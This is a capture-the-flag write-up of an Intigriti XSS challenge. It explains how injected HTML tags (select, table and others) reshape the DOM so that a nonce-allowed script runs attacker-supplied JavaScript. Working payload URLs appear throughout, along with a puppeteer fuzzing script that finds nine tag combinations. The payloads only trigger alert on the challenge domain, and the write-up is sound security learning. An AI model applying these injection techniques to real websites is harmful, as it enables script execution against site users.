# Intigriti's August XSS challenge - by @WHOISbinit

## Target

The challenge is hosted at https://challenge-1021.intigriti.io, and the tweet about it is https://twitter.com/intigriti/status/1452596778130452483.

As stated on the challenge's page, we need to find a way to execute arbitrary JavaScript on the challenge page. However, there are a few rules and information:

```
Rules:

 - This challenge runs from 25 October until 31 October, 11:59 PM CET.
 - Out of all correct submissions, we will draw six winners on Tuesday, 2nd of November:
 -     Three randomly drawn correct submissions
 -     Three best write-ups
 - Every winner gets a €50 swag voucher for our swag shop
 - The winners will be announced on our Twitter profile.
 - For every 100 likes, we'll add a tip to announcement tweet.
 - Join our Discord to discuss the challenge!

The solution...

 - Should work on the latest version of Chrome and FireFox.
 - Should execute alert(document.domain).
 - Should leverage a cross site scripting vulnerability on this domain.
 - Shouldn't be self-XSS or related to MiTM attacks.
 - Should be reported at go.intigriti.com/submit-solution.

```

(taken from https://challenge-1021.intigriti.io / 2021-10-28 18:00 CET)

## Hints

1.  > 100 likes already? Time for a hint!
    >
    > Browser be like: (GIF with "CAN I FIX IT? - NO I CAN'T")
    > https://twitter.com/intigriti/status/1452633787989471237

2.  > 200 likes? ANOTHER HINT!
    >
    > In life, sometimes you need to close doors before others can open. The same goes with HTML tags!
    > https://twitter.com/intigriti/status/1452896673475203074

## Inspecting and understanding challenge/challenge.php

The main challenge takes place on [https://challenge-1021.intigriti.io/challenge/challenge.php](https://challenge-1021.intigriti.io/challenge/challenge.php). The page, which has a really great design, greets us with the following text:

```
HALLOWEEN HAS TAKEN OVER!

ARE YOU SCARED?
ARE YOU STILL SANE?
NOBODY CAN BREAK THIS!
NOBODY CAN SAVE INTIGRITI
I USE ?html= TO CONVEY THESE MESSAGES
I'LL RELEASE INTIGRITI FROM MY WRATH...
... AFTER YOU POP AN XSS
ELSE, INTIGRITI IS MINE!
SIGNED* 1337Witch69
```

The source code of the page is the following:

```html
<html lang="en">
  <head>
    <title>BOOOOOOO!</title>
    <meta
      http-equiv="Content-Security-Policy"
      content="default-src 'none'; script-src 'unsafe-eval' 'strict-dynamic' 'nonce-517230719ae560c06b9c458e41603fbc'; style-src 'nonce-b54a882f3d5e29afe5aa5b7de2745d6b'"
    />

    <style nonce="b54a882f3d5e29afe5aa5b7de2745d6b">
      [just CSS]
    </style>
  </head>
  <body id="body">
  <div class="wrapper"">
  <div class=" bat-overlay">

      <!-- Bats -->
      <svg version="1.1" id="Lager_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 600 400" style="enable-background:new 0 0 600 400;" xml:space="preserve">
    [just SVG]
	</svg>

  </div>

      <script nonce="517230719ae560c06b9c458e41603fbc">document.getElementById('lock').onclick = () => {document.getElementById('lock').classList.toggle('unlocked');}</script>
    <script nonce="517230719ae560c06b9c458e41603fbc">
      window.addEventListener("DOMContentLoaded", function () {
        e = `)]}'` + new URL(location.href).searchParams.get("xss");
        c = document.getElementById("body").lastElementChild;
        if (c.id === "intigriti") {
          l = c.lastElementChild;
          i = l.innerHTML.trim();
          f = i.substr(i.length - 4);
          e = f + e;
        }
        let s = document.createElement("script");
        s.type = "text/javascript";
        s.appendChild(document.createTextNode(e));
        document.body.appendChild(s);
      });
    </script>
  </div>
    <!-- !!! -->
      <div id="html" class="text"><h1 class="light">HALLOWEEN HAS TAKEN OVER!</h1>ARE YOU SCARED?<br/>ARE YOU STILL SANE?<br/>NOBODY CAN BREAK THIS!<br/>NOBODY CAN SAVE INTIGRITI<br/>I USE ?html= TO CONVEY THESE MESSAGES<br/>I'LL RELEASE INTIGRITI FROM MY WRATH... <br/>... AFTER YOU POP AN XSS<br/>ELSE, INTIGRITI IS MINE!<br/>SIGNED* 1337Witch69</div>
    <!-- !!! -->
    <div class="a">'"</div>
  </body>
  <div id="container">
      <span>I</span>
      <span id="extra-flicker">N</span>
      <span>T</span>
      <span>I</span>
      <div id="broken">
          <span id="y">G</span>
      </div>
      <span>R</span>
      <div id="broken">
          <span id="y">I</span>
      </div>
      <span>T</span>
      <span>I</span>
  </div>
</html>
```

The page contains lots of CSS styles and some great looking svg bats. Besides that, there are some HTML tags in the following structure:

- `<body>`
  - `<div class="wrapper"">`
    - `<div class=" bat-overlay">`
    - `<script>`
    - `<script>`
  - `<div id="html">`
  - `<div class="a">'"</div>`
- `<div id="container">`

Right of the bat (;)) we notice some weird structure, e.g. having double quotes at the wrapper class, having a whitespace in front of the `bat-overlay` class, a div with just `'"` content and a div after the closing `body` tag.

All that seems quite weird, but does not really pinpoint to something useful yet. 

As seen in the attributes of the script tag, the page is using a Content-Security-Policy: `default-src 'none'; script-src 'unsafe-eval' 'strict-dynamic' 'nonce-517230719ae560c06b9c458e41603fbc'; style-src 'nonce-b54a882f3d5e29afe5aa5b7de2745d6b'`.
This CSP enables scripts with the given nonce to run `eval` and also to add other `<script>` nodes to be added to the DOM.

### Analyzing the JavaScript

The page contains some script tags. The first one just contains 

```js
document.getElementById("lock").onclick = () => {
  document.getElementById("lock").classList.toggle("unlocked");
};
```

which is quite uninteresting.

The next script contains

```js
window.addEventListener("DOMContentLoaded", function () {
  e = `)]}'` + new URL(location.href).searchParams.get("xss");
  c = document.getElementById("body").lastElementChild;
  if (c.id === "intigriti") {
    l = c.lastElementChild;
    i = l.innerHTML.trim();
    f = i.substr(i.length - 4);
    e = f + e;
  }
  let s = document.createElement("script");
  s.type = "text/javascript";
  s.appendChild(document.createTextNode(e));
  document.body.appendChild(s);
});
```

which is much more interesting. The script first creates a new string, by taking `)]}'` and appending the value of the `xss` query parameter. After that it looks for the last element of `<body>`. If that element has the `id` attribute set to `intigriti`, it will prepend the previously created string with the contents of the last element inside the `intigriti`-element.
That string is then used as the contents of a new `<script>` tag.

So there is already JavaScript added to the DOM and we can control it with the `xss` query parameter. However, currently the JavaScript is not runnable, since the prepended `)]}'` just leads to an error, which will stop further execution.

### Getting the XSS

Let's take a step back. The text on the page hinted us to use the `?html=` query parameter, but we did not try what happens.
If we open the page with the parameter set like here [https://challenge-1021.intigriti.io/challenge/challenge.php?html=test%3Cmarquee%3Etest%3C/marquee%3E](https://challenge-1021.intigriti.io/challenge/challenge.php?html=test%3Cmarquee%3Etest%3C/marquee%3E), we see that we have HTML injection. However, we already know, that the CSP will block any other XSS attempt. The value of the `html` query parameter is rendered into the HTML into the div with the id `html`.

The goal is now to inject some HTML containing the correct structure to prepend the `)]}'` of the JavaScript for a working script. This injected HTML needs to break the DOM somehow, that the last element of the body will have an id of `intigriti`. 

I took a look at [https://developer.mozilla.org/de/docs/Web/HTML/Element](https://developer.mozilla.org/de/docs/Web/HTML/Element) and tried to think about some HTML elements. I thought, that I need an element, which normally just works with child elements inside them. I tried some tags but quickly tried using a `<select>` tag, which indeed lead to it beeing the last element of the body: [https://challenge-1021.intigriti.io/challenge/challenge.php?html=%3C/h1%3E%3C/div%3E%3Cselect%20id=intigriti%3E%3Coption%3Etest%3C/option%3E](https://challenge-1021.intigriti.io/challenge/challenge.php?html=%3C/h1%3E%3C/div%3E%3Cselect%20id=intigriti%3E%3Coption%3Etest%3C/option%3E)

Note, that the `h1` and `div` first needed to close in order to the select beeing the last element.

The above link lead to the following JavaScript been added to the DOM: `test)]}'null`

`null` is just because no `xss` query parameter is set. If we now change `test` with a comment, and `xss` with a newline and the `alert(document.domain)` payload, we finally have our XSS: [https://challenge-1021.intigriti.io/challenge/challenge.php?html=</h1></div><select id=intigriti><option>// </option>&xss=%0aalert(document.domain)](https://challenge-1021.intigriti.io/challenge/challenge.php?html=</h1></div><select id=intigriti><option>// </option>&xss=%0aalert(document.domain))

## Getting other solutions

I quickly noticed some differences of certain HTML elements. The browser puts the last HTML elements inside of most elements, for example `ul` :
[https://challenge-1021.intigriti.io/challenge/challenge.php?html=%3C/h1%3E%3C/div%3E%3Cul%3E](https://challenge-1021.intigriti.io/challenge/challenge.php?html=%3C/h1%3E%3C/div%3E%3Cul%3E) which leads to the `ul` having the following innerHTML:

```html
<ul>
    <!-- !!! -->
    <div class="a">'"</div>
  
  <div id="container">
      <span>I</span>
      <span id="extra-flicker">N</span>
      <span>T</span>
      <span>I</span>
      <div id="broken">
          <span id="y">G</span>
      </div>
      <span>R</span>
      <div id="broken">
          <span id="y">I</span>
      </div>
      <span>T</span>
      <span>I</span>
  </div>

</ul>
```

however, when using a `select`: [https://challenge-1021.intigriti.io/challenge/challenge.php?html=%3C/h1%3E%3C/div%3E%3Cselect%3E](https://challenge-1021.intigriti.io/challenge/challenge.php?html=%3C/h1%3E%3C/div%3E%3Cselect%3E)

```html
<select>
    <!-- !!! -->
    '"
  
  
      I
      N
      T
      I
      
          G
      
      R
      
          I
      
      T
      I
  

</select>
```
the `select` element contains leftovers of the previous HTML tags. That's why the `option` element will just be the last element, even if it will added before the leftovers.

However, if using a `table` as the first tag, we get another scenario: [https://challenge-1021.intigriti.io/challenge/challenge.php?html=%3C/h1%3E%3C/div%3E%3Ctable%3E](https://challenge-1021.intigriti.io/challenge/challenge.php?html=%3C/h1%3E%3C/div%3E%3Ctable%3E)

```html
<table>
    <!-- !!! -->
</table>
```

The `table` does not have the leftovers but only the HTML comment. That's why the `table` tag can also be used for a valid XSS: 
[https://challenge-1021.intigriti.io/challenge/challenge.php?html=%3C/h1%3E%3C/div%3E%3Ctable%20id=%22intigriti%22%3E%3Ctr%3E%3C/tr%3E&xss=%0Aalert(document.domain)](https://challenge-1021.intigriti.io/challenge/challenge.php?html=%3C/h1%3E%3C/div%3E%3Ctable%20id=%22intigriti%22%3E%3Ctr%3E%3C/tr%3E&xss=%0Aalert(document.domain))

The resulting DOM looks like this:

```html
<table id="intigriti">
  <tbody>
    <tr></tr>
    <!-- !!! -->
  </tbody>
</table>
```

Even if we did not add a `tbody` element, the browser adds one before the `tr` elements. That leads to `tbody` beeing the last child of the table. The last 4 characters of the `tbody` inner HTML will be ` -->`. That will lead to the following JavaScript added to the DOM with the `xss` set to `%0Aalert(document.domain)`:

```javascript
 -->)]}'
alert(document.domain)
```

This looks weird, but since [https://challenge-0721.intigriti.io/](https://challenge-0721.intigriti.io/) we know, that `<!--` can also be used as a comment in JavaScript. And today we learned, that also the closing one `-->` can be used as a comment. 

### Finding combinations with a bit of automation

After solving the challenge, I asked myself, what would be the valid combinations. I quickly spun up my own server, which basically serves the challenge locally:

```javascript
import { createServer } from "http";
import { parse } from "url";
import { promises as fs } from "fs";

const port = 3000;
const host = `127.0.0.1`;
let challengeContents = ``;

const server = createServer((req, res) => {
  res.setHeader("Content-Type", "text/html");
  res.writeHead(200);

  res.end(
    challengeContents.replace("%%REPLACE%%", parse(req.url, true).query?.html)
  );
});

fs.readFile("challenge.html").then((contents) => {
  challengeContents = contents.toString();
  server.listen(port, host, () => {
    console.log(`Server is running on http://${host}:${port}`);
  });
});
```

This reads the static file `challenge.html`, which is the challenge's HTML, with the `%%REPLACE%%` where the PHP server adds the given HTML query parameter. I did that by using a "plain" NodeJS server and replacing the HTML at the correct position. Now I can request the same challenge via requesting http://localhost:3000.

Additionally I wrote a small DOM fuzzing script, which uses puppeteer. The fuzzing script uses the previously found and valid URL for XSS and just replaces the `select` and `option` tags with a bunch of elements from a large list:

```js
import puppeteer from "puppeteer";
import PQueue from "p-queue";

const queue = new PQueue({ concurrency: 50 });
const tags = [
  "a",
  "abbr",
  "acronym",
  "address",
  "animate",
  "animatemotion",
  "animatetransform",
  "applet",
  "area",
  "article",
  "aside",
  "audio",
  "b",
  "base",
  "basefont",
  "bdi",
  "bdo",
  "bgsound",
  "big",
  "blink",
  "blockquote",
  "body",
  "br",
  "button",
  "canvas",
  "caption",
  "center",
  "cite",
  "code",
  "col",
  "colgroup",
  "command",
  "content",
  "custom tags",
  "data",
  "datalist",
  "dd",
  "del",
  "details",
  "dfn",
  "dialog",
  "dir",
  "discard",
  "div",
  "dl",
  "dt",
  "element",
  "em",
  "embed",
  "fieldset",
  "figcaption",
  "figure",
  "font",
  "footer",
  "form",
  "frame",
  "frameset",
  "h1",
  "head",
  "header",
  "hgroup",
  "hr",
  "html",
  "i",
  "iframe",
  "image",
  "image2",
  "image3",
  "img",
  "img2",
  "input",
  "input2",
  "input3",
  "input4",
  "ins",
  "isindex",
  "kbd",
  "keygen",
  "label",
  "legend",
  "li",
  "link",
  "listing",
  "main",
  "map",
  "mark",
  "marquee",
  "menu",
  "menuitem",
  "meta",
  "meter",
  "multicol",
  "nav",
  "nextid",
  "nobr",
  "noembed",
  "noframes",
  "noscript",
  "object",
  "ol",
  "optgroup",
  "option",
  "output",
  "p",
  "param",
  "picture",
  "plaintext",
  "pre",
  "progress",
  "q",
  "rb",
  "rp",
  "rt",
  "rtc",
  "ruby",
  "s",
  "samp",
  "script",
  "section",
  "select",
  "set",
  "shadow",
  "slot",
  "small",
  "source",
  "spacer",
  "span",
  "strike",
  "strong",
  "style",
  "sub",
  "summary",
  "sup",
  "svg",
  "table",
  "tbody",
  "td",
  "template",
  "textarea",
  "tfoot",
  "th",
  "thead",
  "time",
  "title",
  "tr",
  "track",
  "tt",
  "u",
  "ul",
  "var",
  "video",
  "wbr",
  "xmp",
];

async function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

let run = 0;

(async () => {
  const browser = await puppeteer.launch();
  for (let tag1 of tags) {
    for (const tag2 of tags) {
      queue.add(async () => {
        const page = await browser.newPage();
        
        page.on("dialog", async (dialog) => {
          console.log(`dialog`, page.url());
          await dialog.dismiss();
        });
        
        // const tag1 = `select`;
        // const tag2 = `option`;
        process.stdout.write(`[${++run}/${tags.length*tags.length}] trying ${tag1}->${tag2}            \r`);
        const url = `http://127.0.0.1:3000/?html=%3C/h1%3E%3C/div%3E%3C${tag1}%20id=%22intigriti%22%3E%3C${tag2}%3E//%20%3C/${tag2}%3E&xss=%0aalert(document.domain)`;

        await page.goto(url);
        await sleep(20);
        await page.close();
      });
    }
  }

})();
```

Since that is not quite performant, fuzzing through the ~23000 combinations takes a while. I though there would be more results coming out, but in total I found 9 combinations of two HTML elements leading to XSS:

- select->optgroup: https://challenge-1021.intigriti.io/challenge/challenge.php?html=%3C/h1%3E%3C/div%3E%3Cselect%20id=%22intigriti%22%3E%3Coptgroup%3E//%20%3C/optgroup%3E&xss=%0aalert(document.domain)
- select->option: https://challenge-1021.intigriti.io/challenge/challenge.php?html=%3C/h1%3E%3C/div%3E%3Cselect%20id=%22intigriti%22%3E%3Coption%3E//%20%3C/option%3E&xss=%0aalert(document.domain)
- select->script: https://challenge-1021.intigriti.io/challenge/challenge.php?html=%3C/h1%3E%3C/div%3E%3Cselect%20id=%22intigriti%22%3E%3Cscript%3E//%20%3C/script%3E&xss=%0aalert(document.domain)
- select->template: https://challenge-1021.intigriti.io/challenge/challenge.php?html=%3C/h1%3E%3C/div%3E%3Cselect%20id=%22intigriti%22%3E%3Ctemplate%3E//%20%3C/template%3E&xss=%0aalert(document.domain)
- table->caption: https://challenge-1021.intigriti.io/challenge/challenge.php?html=%3C/h1%3E%3C/div%3E%3Ctable%20id=%22intigriti%22%3E%3Ccaption%3E//%20%3C/caption%3E&xss=%0aalert(document.domain)
- table->script: https://challenge-1021.intigriti.io/challenge/challenge.php?html=%3C/h1%3E%3C/div%3E%3Ctable%20id=%22intigriti%22%3E%3Cscript%3E//%20%3C/script%3E&xss=%0aalert(document.domain)
- table->style: https://challenge-1021.intigriti.io/challenge/challenge.php?html=%3C/h1%3E%3C/div%3E%3Ctable%20id=%22intigriti%22%3E%3Cstyle%3E//%20%3C/style%3E&xss=%0aalert(document.domain)
- table->template: https://challenge-1021.intigriti.io/challenge/challenge.php?html=%3C/h1%3E%3C/div%3E%3Ctable%20id=%22intigriti%22%3E%3Ctemplate%3E//%20%3C/template%3E&xss=%0aalert(document.domain)
- table->tr: https://challenge-1021.intigriti.io/challenge/challenge.php?html=%3C/h1%3E%3C/div%3E%3Ctable%20id=%22intigriti%22%3E%3Ctr%3E//%20%3C/tr%3E&xss=%0aalert(document.domain)
